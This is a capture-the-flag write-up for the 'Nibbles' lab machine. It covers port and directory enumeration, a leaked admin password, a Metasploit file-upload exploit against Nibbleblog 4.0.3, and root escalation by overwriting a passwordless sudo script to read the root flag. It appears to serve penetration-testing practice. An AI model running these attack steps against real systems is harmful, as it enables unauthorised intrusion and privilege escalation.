# Machine: Nibbles

## Enumeration

### Services

Start with a full port scan:

```bash
nmap -sS -p- <IP> -oN full_tcp_ports.txt
```

The scan reveals two open ports:

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Next, scan the discovered ports in verbose and script mode:

```bash
nmap -sV -sC -O -p22,80 <IP> -oN ports.txt -oX ports.xml

Output:

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-methods: 
|_  Supported Methods: POST OPTIONS GET HEAD
```

The OS is identified as Ubuntu.

### Port 80

Running a curl request to gather information:

```bash
curl -v "http://nibbles.htb"
```

I found the following comment in the webpage source:

```php
<!-- /nibbleblog/ directory. Nothing interesting here! -->
```

Using ffuf for directory enumeration:

```bash
ffuf -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u "http://nibbles.htb/nibbleblog/FUZZ" -o directory-list-2.3-medium.md -of md -e .php,.txt
```

Notable findings:

* http://nibbles.htb/nibbleblog/README: Identifies the software version as Nibbleblog 4.0.3.
* http://nibbles.htb/nibbleblog/content/: Index page with several folders. Found http://nibbles.htb/nibbleblog/content/private/users.xml revealing a user admin.
* http://nibbles.htb/nibbleblog/admin.php: Admin login page. The password was nibbles.

## Exploitation

Identified a known vulnerability in Nibbleblog 4.0.3:

```bash
searchsploit nibbleblog                 
---------------------------------------------------------------
 Exploit Title                                                 |  Path
---------------------------------------------------------------
Nibbleblog 4.0.3 - Arbitrary File Upload (Metasploit)          | php/remote/38489.rb
```

Using Metasploit to exploit the vulnerability:

```bash
use exploit/multi/http/nibbleblog_file_upload
```

I obtained a shell as the nibbler user:

```bash
nibbler@Nibbles:/home/nibbler$ whoami
whoami
nibbler
```

## Privilege Escalation

Discovered sudo permissions for nibbler without a password:

```bash
nibbler@Nibbles:/home/nibbler$ sudo -l
sudo -l
Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```

Editing the monitor.sh script to read the root flag:

```bash
echo "cat /root/root.txt" > /home/nibbler/personal/stuff/monitor.sh
sudo /home/nibbler/personal/stuff/monitor.sh
```

This documentation outlines the steps taken to enumerate, exploit, and escalate privileges on the Nibbles machine. The structured approach aids in understanding the process and can serve as a reference for similar challenges.

***
